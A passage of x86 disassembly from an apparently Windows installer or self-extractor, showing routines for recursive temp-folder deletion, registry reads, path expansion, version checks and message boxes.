  402387:	e8 54 49 00 00       	call   0x406ce0
  40238c:	8b e5                	mov    %ebp,%esp
  40238e:	5d                   	pop    %ebp
  40238f:	c3                   	ret
  402390:	8b ff                	mov    %edi,%edi
  402392:	55                   	push   %ebp
  402393:	8b ec                	mov    %esp,%ebp
  402395:	83 e4 f8             	and    $0xfffffff8,%esp
  402398:	81 ec 54 02 00 00    	sub    $0x254,%esp
  40239e:	a1 04 80 40 00       	mov    0x408004,%eax
  4023a3:	33 c4                	xor    %esp,%eax
  4023a5:	89 84 24 50 02 00 00 	mov    %eax,0x250(%esp)
  4023ac:	53                   	push   %ebx
  4023ad:	56                   	push   %esi
  4023ae:	8b f1                	mov    %ecx,%esi
  4023b0:	57                   	push   %edi
  4023b1:	85 f6                	test   %esi,%esi
  4023b3:	0f 84 12 01 00 00    	je     0x4024cb
  4023b9:	80 3e 00             	cmpb   $0x0,(%esi)
  4023bc:	0f 84 09 01 00 00    	je     0x4024cb
  4023c2:	bb 04 01 00 00       	mov    $0x104,%ebx
  4023c7:	8d 8c 24 50 01 00 00 	lea    0x150(%esp),%ecx
  4023ce:	56                   	push   %esi
  4023cf:	8b d3                	mov    %ebx,%edx
  4023d1:	e8 aa f2 ff ff       	call   0x401680
  4023d6:	68 f4 11 40 00       	push   $0x4011f4
  4023db:	8b d3                	mov    %ebx,%edx
  4023dd:	8d 8c 24 54 01 00 00 	lea    0x154(%esp),%ecx
  4023e4:	e8 ca f2 ff ff       	call   0x4016b3
  4023e9:	8d 44 24 10          	lea    0x10(%esp),%eax
  4023ed:	50                   	push   %eax
  4023ee:	8d 84 24 54 01 00 00 	lea    0x154(%esp),%eax
  4023f5:	50                   	push   %eax
  4023f6:	ff 15 94 a1 40 00    	call   *0x40a194
  4023fc:	8b f8                	mov    %eax,%edi
  4023fe:	83 ff ff             	cmp    $0xffffffff,%edi
  402401:	0f 84 c4 00 00 00    	je     0x4024cb
  402407:	56                   	push   %esi
  402408:	8b d3                	mov    %ebx,%edx
  40240a:	8d 8c 24 54 01 00 00 	lea    0x154(%esp),%ecx
  402411:	e8 6a f2 ff ff       	call   0x401680
  402416:	f6 44 24 10 10       	testb  $0x10,0x10(%esp)
  40241b:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  40241f:	74 58                	je     0x402479
  402421:	68 f8 11 40 00       	push   $0x4011f8
  402426:	50                   	push   %eax
  402427:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  40242d:	85 c0                	test   %eax,%eax
  40242f:	74 78                	je     0x4024a9
  402431:	68 fc 11 40 00       	push   $0x4011fc
  402436:	8d 44 24 40          	lea    0x40(%esp),%eax
  40243a:	50                   	push   %eax
  40243b:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  402441:	85 c0                	test   %eax,%eax
  402443:	74 64                	je     0x4024a9
  402445:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402449:	8b d3                	mov    %ebx,%edx
  40244b:	50                   	push   %eax
  40244c:	8d 8c 24 54 01 00 00 	lea    0x154(%esp),%ecx
  402453:	e8 5b f2 ff ff       	call   0x4016b3
  402458:	68 40 11 40 00       	push   $0x401140
  40245d:	8b d3                	mov    %ebx,%edx
  40245f:	8d 8c 24 54 01 00 00 	lea    0x154(%esp),%ecx
  402466:	e8 1f 41 00 00       	call   0x40658a
  40246b:	8d 8c 24 50 01 00 00 	lea    0x150(%esp),%ecx
  402472:	e8 19 ff ff ff       	call   0x402390
  402477:	eb 30                	jmp    0x4024a9
  402479:	50                   	push   %eax
  40247a:	8b d3                	mov    %ebx,%edx
  40247c:	8d 8c 24 54 01 00 00 	lea    0x154(%esp),%ecx
  402483:	e8 2b f2 ff ff       	call   0x4016b3
  402488:	68 80 00 00 00       	push   $0x80
  40248d:	8d 84 24 54 01 00 00 	lea    0x154(%esp),%eax
  402494:	50                   	push   %eax
  402495:	ff 15 98 a0 40 00    	call   *0x40a098
  40249b:	8d 84 24 50 01 00 00 	lea    0x150(%esp),%eax
  4024a2:	50                   	push   %eax
  4024a3:	ff 15 7c a0 40 00    	call   *0x40a07c
  4024a9:	8d 44 24 10          	lea    0x10(%esp),%eax
  4024ad:	50                   	push   %eax
  4024ae:	57                   	push   %edi
  4024af:	ff 15 4c a1 40 00    	call   *0x40a14c
  4024b5:	85 c0                	test   %eax,%eax
  4024b7:	0f 85 4a ff ff ff    	jne    0x402407
  4024bd:	57                   	push   %edi
  4024be:	ff 15 8c a1 40 00    	call   *0x40a18c
  4024c4:	56                   	push   %esi
  4024c5:	ff 15 a8 a0 40 00    	call   *0x40a0a8
  4024cb:	8b 8c 24 5c 02 00 00 	mov    0x25c(%esp),%ecx
  4024d2:	5f                   	pop    %edi
  4024d3:	5e                   	pop    %esi
  4024d4:	5b                   	pop    %ebx
  4024d5:	33 cc                	xor    %esp,%ecx
  4024d7:	e8 04 48 00 00       	call   0x406ce0
  4024dc:	8b e5                	mov    %ebp,%esp
  4024de:	5d                   	pop    %ebp
  4024df:	c3                   	ret
  4024e0:	8b ff                	mov    %edi,%edi
  4024e2:	55                   	push   %ebp
  4024e3:	8b ec                	mov    %esp,%ebp
  4024e5:	81 ec 08 01 00 00    	sub    $0x108,%esp
  4024eb:	a1 04 80 40 00       	mov    0x408004,%eax
  4024f0:	33 c5                	xor    %ebp,%eax
  4024f2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024f5:	56                   	push   %esi
  4024f6:	57                   	push   %edi
  4024f7:	bf 04 01 00 00       	mov    $0x104,%edi
  4024fc:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402502:	57                   	push   %edi
  402503:	50                   	push   %eax
  402504:	33 f6                	xor    %esi,%esi
  402506:	ff 15 94 a0 40 00    	call   *0x40a094
  40250c:	85 c0                	test   %eax,%eax
  40250e:	74 4b                	je     0x40255b
  402510:	68 00 12 40 00       	push   $0x401200
  402515:	8b d7                	mov    %edi,%edx
  402517:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  40251d:	e8 68 40 00 00       	call   0x40658a
  402522:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402528:	50                   	push   %eax
  402529:	56                   	push   %esi
  40252a:	56                   	push   %esi
  40252b:	56                   	push   %esi
  40252c:	ff 15 8c a0 40 00    	call   *0x40a08c
  402532:	6a 40                	push   $0x40
  402534:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40253a:	50                   	push   %eax
  40253b:	ff 15 60 a0 40 00    	call   *0x40a060
  402541:	8b f8                	mov    %eax,%edi
  402543:	83 ff ff             	cmp    $0xffffffff,%edi
  402546:	74 13                	je     0x40255b
  402548:	6a 02                	push   $0x2
  40254a:	56                   	push   %esi
  40254b:	57                   	push   %edi
  40254c:	ff 15 64 a0 40 00    	call   *0x40a064
  402552:	57                   	push   %edi
  402553:	8b f0                	mov    %eax,%esi
  402555:	ff 15 b0 a0 40 00    	call   *0x40a0b0
  40255b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40255e:	8b c6                	mov    %esi,%eax
  402560:	5f                   	pop    %edi
  402561:	33 cd                	xor    %ebp,%ecx
  402563:	5e                   	pop    %esi
  402564:	e8 77 47 00 00       	call   0x406ce0
  402569:	8b e5                	mov    %ebp,%esp
  40256b:	5d                   	pop    %ebp
  40256c:	c3                   	ret
  40256d:	8b ff                	mov    %edi,%edi
  40256f:	55                   	push   %ebp
  402570:	8b ec                	mov    %esp,%ebp
  402572:	51                   	push   %ecx
  402573:	51                   	push   %ecx
  402574:	56                   	push   %esi
  402575:	0f b7 c1             	movzwl %cx,%eax
  402578:	33 f6                	xor    %esi,%esi
  40257a:	66 85 c0             	test   %ax,%ax
  40257d:	0f 84 9f 00 00 00    	je     0x402622
  402583:	33 d2                	xor    %edx,%edx
  402585:	42                   	inc    %edx
  402586:	66 3b c2             	cmp    %dx,%ax
  402589:	74 5d                	je     0x4025e8
  40258b:	0f 86 98 00 00 00    	jbe    0x402629
  402591:	66 83 f9 03          	cmp    $0x3,%cx
  402595:	0f 87 8e 00 00 00    	ja     0x402629
  40259b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40259e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4025a1:	50                   	push   %eax
  4025a2:	68 19 00 02 00       	push   $0x20019
  4025a7:	56                   	push   %esi
  4025a8:	68 0c 80 40 00       	push   $0x40800c
  4025ad:	68 02 00 00 80       	push   $0x80000002
  4025b2:	ff 15 08 a0 40 00    	call   *0x40a008
  4025b8:	85 c0                	test   %eax,%eax
  4025ba:	75 27                	jne    0x4025e3
  4025bc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4025bf:	50                   	push   %eax
  4025c0:	56                   	push   %esi
  4025c1:	56                   	push   %esi
  4025c2:	56                   	push   %esi
  4025c3:	68 e8 80 40 00       	push   $0x4080e8
  4025c8:	ff 75 f8             	push   -0x8(%ebp)
  4025cb:	ff 15 28 a0 40 00    	call   *0x40a028
  4025d1:	ff 75 f8             	push   -0x8(%ebp)
  4025d4:	f7 d8                	neg    %eax
  4025d6:	1b c0                	sbb    %eax,%eax
  4025d8:	f7 d0                	not    %eax
  4025da:	21 45 fc             	and    %eax,-0x4(%ebp)
  4025dd:	ff 15 30 a0 40 00    	call   *0x40a030
  4025e3:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4025e6:	eb 41                	jmp    0x402629
  4025e8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4025eb:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4025ee:	50                   	push   %eax
  4025ef:	68 19 00 02 00       	push   $0x20019
  4025f4:	56                   	push   %esi
  4025f5:	68 38 81 40 00       	push   $0x408138
  4025fa:	68 02 00 00 80       	push   $0x80000002
  4025ff:	ff 15 08 a0 40 00    	call   *0x40a008
  402605:	85 c0                	test   %eax,%eax
  402607:	75 da                	jne    0x4025e3
  402609:	56                   	push   %esi
  40260a:	56                   	push   %esi
  40260b:	56                   	push   %esi
  40260c:	56                   	push   %esi
  40260d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402610:	50                   	push   %eax
  402611:	56                   	push   %esi
  402612:	56                   	push   %esi
  402613:	56                   	push   %esi
  402614:	56                   	push   %esi
  402615:	56                   	push   %esi
  402616:	56                   	push   %esi
  402617:	ff 75 f8             	push   -0x8(%ebp)
  40261a:	ff 15 0c a0 40 00    	call   *0x40a00c
  402620:	eb af                	jmp    0x4025d1
  402622:	e8 b9 fe ff ff       	call   0x4024e0
  402627:	8b f0                	mov    %eax,%esi
  402629:	8b c6                	mov    %esi,%eax
  40262b:	5e                   	pop    %esi
  40262c:	8b e5                	mov    %ebp,%esp
  40262e:	5d                   	pop    %ebp
  40262f:	c3                   	ret
  402630:	8b ff                	mov    %edi,%edi
  402632:	55                   	push   %ebp
  402633:	8b ec                	mov    %esp,%ebp
  402635:	81 ec 08 01 00 00    	sub    $0x108,%esp
  40263b:	a1 04 80 40 00       	mov    0x408004,%eax
  402640:	33 c5                	xor    %ebp,%eax
  402642:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402645:	56                   	push   %esi
  402646:	68 04 01 00 00       	push   $0x104
  40264b:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402651:	8b f1                	mov    %ecx,%esi
  402653:	50                   	push   %eax
  402654:	ff 15 94 a0 40 00    	call   *0x40a094
  40265a:	85 c0                	test   %eax,%eax
  40265c:	75 11                	jne    0x40266f
  40265e:	50                   	push   %eax
  40265f:	6a 10                	push   $0x10
  402661:	50                   	push   %eax
  402662:	50                   	push   %eax
  402663:	ba f0 04 00 00       	mov    $0x4f0,%edx
  402668:	33 c9                	xor    %ecx,%ecx
  40266a:	e8 4a 1e 00 00       	call   0x4044b9
  40266f:	8a 0e                	mov    (%esi),%cl
  402671:	33 c0                	xor    %eax,%eax
  402673:	3a 8d f8 fe ff ff    	cmp    -0x108(%ebp),%cl
  402679:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40267c:	0f 94 c0             	sete   %al
  40267f:	33 cd                	xor    %ebp,%ecx
  402681:	5e                   	pop    %esi
  402682:	e8 59 46 00 00       	call   0x406ce0
  402687:	8b e5                	mov    %ebp,%esp
  402689:	5d                   	pop    %ebp
  40268a:	c3                   	ret
  40268b:	8b ff                	mov    %edi,%edi
  40268d:	55                   	push   %ebp
  40268e:	8b ec                	mov    %esp,%ebp
  402690:	83 ec 10             	sub    $0x10,%esp
  402693:	a1 04 80 40 00       	mov    0x408004,%eax
  402698:	33 c5                	xor    %ebp,%eax
  40269a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40269d:	8b 45 08             	mov    0x8(%ebp),%eax
  4026a0:	53                   	push   %ebx
  4026a1:	56                   	push   %esi
  4026a2:	33 db                	xor    %ebx,%ebx
  4026a4:	c7 05 24 91 40 00 70 	movl   $0x70,0x409124
  4026ab:	00 00 00 
  4026ae:	8b f3                	mov    %ebx,%esi
  4026b0:	57                   	push   %edi
  4026b1:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4026b4:	83 f9 01             	cmp    $0x1,%ecx
  4026b7:	75 2c                	jne    0x4026e5
  4026b9:	03 c2                	add    %edx,%eax
  4026bb:	50                   	push   %eax
  4026bc:	68 0c 12 40 00       	push   $0x40120c
  4026c1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4026c4:	6a 0a                	push   $0xa
  4026c6:	50                   	push   %eax
  4026c7:	e8 52 f0 ff ff       	call   0x40171e
  4026cc:	83 c4 10             	add    $0x10,%esp
  4026cf:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4026d2:	ba fa 04 00 00       	mov    $0x4fa,%edx
  4026d7:	33 c9                	xor    %ecx,%ecx
  4026d9:	53                   	push   %ebx
  4026da:	6a 10                	push   $0x10
  4026dc:	53                   	push   %ebx
  4026dd:	50                   	push   %eax
  4026de:	e8 d6 1d 00 00       	call   0x4044b9
  4026e3:	eb 79                	jmp    0x40275e
  4026e5:	83 f9 04             	cmp    $0x4,%ecx
  4026e8:	75 35                	jne    0x40271f
  4026ea:	03 c2                	add    %edx,%eax
  4026ec:	50                   	push   %eax
  4026ed:	68 0c 12 40 00       	push   $0x40120c
  4026f2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4026f5:	6a 0a                	push   $0xa
  4026f7:	50                   	push   %eax
  4026f8:	e8 21 f0 ff ff       	call   0x40171e
  4026fd:	83 c4 10             	add    $0x10,%esp
  402700:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402703:	ba bd 04 00 00       	mov    $0x4bd,%edx
  402708:	33 c9                	xor    %ecx,%ecx
  40270a:	6a 05                	push   $0x5
  40270c:	6a 20                	push   $0x20
  40270e:	53                   	push   %ebx
  40270f:	50                   	push   %eax
  402710:	e8 a4 1d 00 00       	call   0x4044b9
  402715:	8d 70 fc             	lea    -0x4(%eax),%esi
  402718:	f7 de                	neg    %esi
  40271a:	1b f6                	sbb    %esi,%esi
  40271c:	46                   	inc    %esi
  40271d:	eb 3f                	jmp    0x40275e
  40271f:	83 f9 02             	cmp    $0x2,%ecx
  402722:	75 3a                	jne    0x40275e
  402724:	50                   	push   %eax
  402725:	68 0c 12 40 00       	push   $0x40120c
  40272a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40272d:	6a 0a                	push   $0xa
  40272f:	50                   	push   %eax
  402730:	e8 e9 ef ff ff       	call   0x40171e
  402735:	83 c4 10             	add    $0x10,%esp
  402738:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40273b:	ba cc 04 00 00       	mov    $0x4cc,%edx
  402740:	33 c9                	xor    %ecx,%ecx
  402742:	68 04 01 00 00       	push   $0x104
  402747:	6a 40                	push   $0x40
  402749:	57                   	push   %edi
  40274a:	50                   	push   %eax
  40274b:	e8 69 1d 00 00       	call   0x4044b9
  402750:	83 f8 06             	cmp    $0x6,%eax
  402753:	75 09                	jne    0x40275e
  402755:	33 f6                	xor    %esi,%esi
  402757:	89 1d 24 91 40 00    	mov    %ebx,0x409124
  40275d:	46                   	inc    %esi
  40275e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402761:	8b c6                	mov    %esi,%eax
  402763:	5f                   	pop    %edi
  402764:	5e                   	pop    %esi
  402765:	33 cd                	xor    %ebp,%ecx
  402767:	5b                   	pop    %ebx
  402768:	e8 73 45 00 00       	call   0x406ce0
  40276d:	8b e5                	mov    %ebp,%esp
  40276f:	5d                   	pop    %ebp
  402770:	c2 08 00             	ret    $0x8
  402773:	8b ff                	mov    %edi,%edi
  402775:	55                   	push   %ebp
  402776:	8b ec                	mov    %esp,%ebp
  402778:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
  40277e:	a1 04 80 40 00       	mov    0x408004,%eax
  402783:	33 c5                	xor    %ebp,%eax
  402785:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402788:	53                   	push   %ebx
  402789:	56                   	push   %esi
  40278a:	8b 75 08             	mov    0x8(%ebp),%esi
  40278d:	33 db                	xor    %ebx,%ebx
  40278f:	57                   	push   %edi
  402790:	8b f9                	mov    %ecx,%edi
  402792:	89 b5 f0 fe ff ff    	mov    %esi,-0x110(%ebp)
  402798:	88 1f                	mov    %bl,(%edi)
  40279a:	80 3e 23             	cmpb   $0x23,(%esi)
  40279d:	0f 85 0f 01 00 00    	jne    0x4028b2
  4027a3:	46                   	inc    %esi
  4027a4:	0f be 06             	movsbl (%esi),%eax
  4027a7:	50                   	push   %eax
  4027a8:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  4027ae:	56                   	push   %esi
  4027af:	88 85 f7 fe ff ff    	mov    %al,-0x109(%ebp)
  4027b5:	ff 15 ec a1 40 00    	call   *0x40a1ec
  4027bb:	50                   	push   %eax
  4027bc:	ff 15 ec a1 40 00    	call   *0x40a1ec
  4027c2:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
  4027c8:	be 04 01 00 00       	mov    $0x104,%esi
  4027cd:	8a 85 f7 fe ff ff    	mov    -0x109(%ebp),%al
  4027d3:	3c 53                	cmp    $0x53,%al
  4027d5:	0f 84 dc 00 00 00    	je     0x4028b7
  4027db:	3c 57                	cmp    $0x57,%al
  4027dd:	0f 84 c5 00 00 00    	je     0x4028a8
  4027e3:	51                   	push   %ecx
  4027e4:	68 10 12 40 00       	push   $0x401210
  4027e9:	51                   	push   %ecx
  4027ea:	8b d6                	mov    %esi,%edx
  4027ec:	89 b5 e4 fe ff ff    	mov    %esi,-0x11c(%ebp)
  4027f2:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  4027f8:	e8 84 ef ff ff       	call   0x401781
  4027fd:	ff b5 f0 fe ff ff    	push   -0x110(%ebp)
  402803:	8b d6                	mov    %esi,%edx
  402805:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  40280b:	e8 7a 3d 00 00       	call   0x40658a
  402810:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  402816:	50                   	push   %eax
  402817:	68 19 00 02 00       	push   $0x20019
  40281c:	53                   	push   %ebx
  40281d:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402823:	50                   	push   %eax
  402824:	68 02 00 00 80       	push   $0x80000002
  402829:	ff 15 08 a0 40 00    	call   *0x40a008
  40282f:	85 c0                	test   %eax,%eax
  402831:	0f 85 8c 00 00 00    	jne    0x4028c3
  402837:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
  40283d:	50                   	push   %eax
  40283e:	57                   	push   %edi
  40283f:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  402845:	50                   	push   %eax
  402846:	53                   	push   %ebx
  402847:	68 40 11 40 00       	push   $0x401140
  40284c:	ff b5 e8 fe ff ff    	push   -0x118(%ebp)
  402852:	ff 15 28 a0 40 00    	call   *0x40a028
  402858:	85 c0                	test   %eax,%eax
  40285a:	75 3e                	jne    0x40289a
  40285c:	8b 85 ec fe ff ff    	mov    -0x114(%ebp),%eax
  402862:	83 f8 02             	cmp    $0x2,%eax
  402865:	75 2b                	jne    0x402892
  402867:	56                   	push   %esi
  402868:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40286e:	50                   	push   %eax
  40286f:	57                   	push   %edi
  402870:	ff 15 ec a0 40 00    	call   *0x40a0ec
  402876:	85 c0                	test   %eax,%eax
  402878:	74 12                	je     0x40288c
  40287a:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402880:	8b d6                	mov    %esi,%edx
  402882:	50                   	push   %eax
  402883:	8b cf                	mov    %edi,%ecx
  402885:	e8 f6 ed ff ff       	call   0x401680
  40288a:	eb 0b                	jmp    0x402897
  40288c:	8b 85 ec fe ff ff    	mov    -0x114(%ebp),%eax
  402892:	83 f8 01             	cmp    $0x1,%eax
  402895:	75 03                	jne    0x40289a
  402897:	33 db                	xor    %ebx,%ebx
  402899:	43                   	inc    %ebx
  40289a:	ff b5 e8 fe ff ff    	push   -0x118(%ebp)
  4028a0:	ff 15 30 a0 40 00    	call   *0x40a030
  4028a6:	eb 17                	jmp    0x4028bf
  4028a8:	56                   	push   %esi
  4028a9:	57                   	push   %edi
  4028aa:	ff 15 94 a0 40 00    	call   *0x40a094
  4028b0:	eb 11                	jmp    0x4028c3
  4028b2:	be 04 01 00 00       	mov    $0x104,%esi
  4028b7:	56                   	push   %esi
  4028b8:	57                   	push   %edi
  4028b9:	ff 15 74 a0 40 00    	call   *0x40a074
  4028bf:	85 db                	test   %ebx,%ebx
  4028c1:	75 0f                	jne    0x4028d2
  4028c3:	ff b5 f0 fe ff ff    	push   -0x110(%ebp)
  4028c9:	8b d6                	mov    %esi,%edx
  4028cb:	8b cf                	mov    %edi,%ecx
  4028cd:	e8 b8 3c 00 00       	call   0x40658a
  4028d2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4028d5:	33 c0                	xor    %eax,%eax
  4028d7:	5f                   	pop    %edi
  4028d8:	5e                   	pop    %esi
  4028d9:	33 cd                	xor    %ebp,%ecx
  4028db:	40                   	inc    %eax
  4028dc:	5b                   	pop    %ebx
  4028dd:	e8 fe 43 00 00       	call   0x406ce0
  4028e2:	8b e5                	mov    %ebp,%esp
  4028e4:	5d                   	pop    %ebp
  4028e5:	c2 04 00             	ret    $0x4
  4028e8:	8b ff                	mov    %edi,%edi
  4028ea:	55                   	push   %ebp
  4028eb:	8b ec                	mov    %esp,%ebp
  4028ed:	83 ec 3c             	sub    $0x3c,%esp
  4028f0:	53                   	push   %ebx
  4028f1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4028f4:	8b d1                	mov    %ecx,%edx
  4028f6:	56                   	push   %esi
  4028f7:	33 f6                	xor    %esi,%esi
  4028f9:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4028fc:	8b de                	mov    %esi,%ebx
  4028fe:	57                   	push   %edi
  4028ff:	8b fe                	mov    %esi,%edi
  402901:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402904:	39 72 7c             	cmp    %esi,0x7c(%edx)
  402907:	0f 8e 55 01 00 00    	jle    0x402a62
  40290d:	8b c6                	mov    %esi,%eax
  40290f:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402912:	8b 8a 80 00 00 00    	mov    0x80(%edx),%ecx
  402918:	03 c2                	add    %edx,%eax
  40291a:	81 c2 84 00 00 00    	add    $0x84,%edx
  402920:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  402923:	8b 84 08 bc 00 00 00 	mov    0xbc(%eax,%ecx,1),%eax
  40292a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40292d:	03 c2                	add    %edx,%eax
  40292f:	50                   	push   %eax
  402930:	e8 3e fe ff ff       	call   0x402773
  402935:	85 c0                	test   %eax,%eax
  402937:	0f 84 28 01 00 00    	je     0x402a65
  40293d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  402940:	50                   	push   %eax
  402941:	ff 75 f8             	push   -0x8(%ebp)
  402944:	ff 15 2c a2 40 00    	call   *0x40a22c
  40294a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40294d:	85 c0                	test   %eax,%eax
  40294f:	0f 84 d7 00 00 00    	je     0x402a2c
  402955:	50                   	push   %eax
  402956:	6a 42                	push   $0x42
  402958:	ff 15 80 a0 40 00    	call   *0x40a080
  40295e:	8b f8                	mov    %eax,%edi
  402960:	85 ff                	test   %edi,%edi
  402962:	0f 84 fd 00 00 00    	je     0x402a65
  402968:	57                   	push   %edi
  402969:	ff 15 a0 a0 40 00    	call   *0x40a0a0
  40296f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402972:	85 c0                	test   %eax,%eax
  402974:	0f 84 eb 00 00 00    	je     0x402a65
  40297a:	50                   	push   %eax
  40297b:	ff 75 e8             	push   -0x18(%ebp)
  40297e:	ff 75 e4             	push   -0x1c(%ebp)
  402981:	ff 75 f8             	push   -0x8(%ebp)
  402984:	ff 15 24 a2 40 00    	call   *0x40a224
  40298a:	85 c0                	test   %eax,%eax
  40298c:	0f 84 8e 00 00 00    	je     0x402a20
  402992:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402995:	50                   	push   %eax
  402996:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402999:	50                   	push   %eax
  40299a:	68 44 12 40 00       	push   $0x401244
  40299f:	ff 75 e0             	push   -0x20(%ebp)
  4029a2:	ff 15 28 a2 40 00    	call   *0x40a228
  4029a8:	85 c0                	test   %eax,%eax
  4029aa:	74 74                	je     0x402a20
  4029ac:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  4029b0:	74 6e                	je     0x402a20
  4029b2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4029b5:	8b de                	mov    %esi,%ebx
  4029b7:	8b 48 0c             	mov    0xc(%eax),%ecx
  4029ba:	8b 40 08             	mov    0x8(%eax),%eax
  4029bd:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4029c0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4029c3:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4029c6:	81 c1 94 00 00 00    	add    $0x94,%ecx
  4029cc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4029cf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4029d2:	03 45 f4             	add    -0xc(%ebp),%eax
  4029d5:	03 c1                	add    %ecx,%eax
  4029d7:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4029da:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4029dd:	8b f0                	mov    %eax,%esi
  4029df:	ff 76 f4             	push   -0xc(%esi)
  4029e2:	ff 76 f0             	push   -0x10(%esi)
  4029e5:	e8 9f 00 00 00       	call   0x402a89
  4029ea:	ff 36                	push   (%esi)
  4029ec:	89 44 1d cc          	mov    %eax,-0x34(%ebp,%ebx,1)
  4029f0:	ff 76 fc             	push   -0x4(%esi)
  4029f3:	e8 91 00 00 00       	call   0x402a89
  4029f8:	89 44 1d c4          	mov    %eax,-0x3c(%ebp,%ebx,1)
  4029fc:	8d 76 18             	lea    0x18(%esi),%esi
  4029ff:	83 c3 04             	add    $0x4,%ebx
  402a02:	83 fb 08             	cmp    $0x8,%ebx
  402a05:	7c d8                	jl     0x4029df
  402a07:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  402a0a:	33 f6                	xor    %esi,%esi
  402a0c:	39 75 cc             	cmp    %esi,-0x34(%ebp)
  402a0f:	7c 05                	jl     0x402a16
  402a11:	39 75 c4             	cmp    %esi,-0x3c(%ebp)
  402a14:	7e 0a                	jle    0x402a20
  402a16:	39 75 d0             	cmp    %esi,-0x30(%ebp)
  402a19:	7c 65                	jl     0x402a80
  402a1b:	39 75 c8             	cmp    %esi,-0x38(%ebp)
  402a1e:	7f 60                	jg     0x402a80
  402a20:	57                   	push   %edi
  402a21:	ff 15 c0 a0 40 00    	call   *0x40a0c0
  402a27:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402a2a:	eb 20                	jmp    0x402a4c
  402a2c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a2f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402a32:	03 c2                	add    %edx,%eax
  402a34:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402a37:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  402a3a:	39 b4 08 84 00 00 00 	cmp    %esi,0x84(%eax,%ecx,1)
  402a41:	75 22                	jne    0x402a65
  402a43:	39 b4 08 88 00 00 00 	cmp    %esi,0x88(%eax,%ecx,1)
  402a4a:	75 19                	jne    0x402a65
  402a4c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a4f:	43                   	inc    %ebx
  402a50:	83 c0 3c             	add    $0x3c,%eax
  402a53:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402a56:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402a59:	3b 5a 7c             	cmp    0x7c(%edx),%ebx
  402a5c:	0f 8c b0 fe ff ff    	jl     0x402912
  402a62:	33 f6                	xor    %esi,%esi
  402a64:	46                   	inc    %esi
  402a65:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402a68:	89 19                	mov    %ebx,(%ecx)
  402a6a:	85 ff                	test   %edi,%edi
  402a6c:	74 07                	je     0x402a75
  402a6e:	57                   	push   %edi
  402a6f:	ff 15 84 a0 40 00    	call   *0x40a084
  402a75:	5f                   	pop    %edi
  402a76:	8b c6                	mov    %esi,%eax
  402a78:	5e                   	pop    %esi
  402a79:	5b                   	pop    %ebx
  402a7a:	8b e5                	mov    %ebp,%esp
  402a7c:	5d                   	pop    %ebp
  402a7d:	c2 08 00             	ret    $0x8
  402a80:	57                   	push   %edi
  402a81:	ff 15 c0 a0 40 00    	call   *0x40a0c0
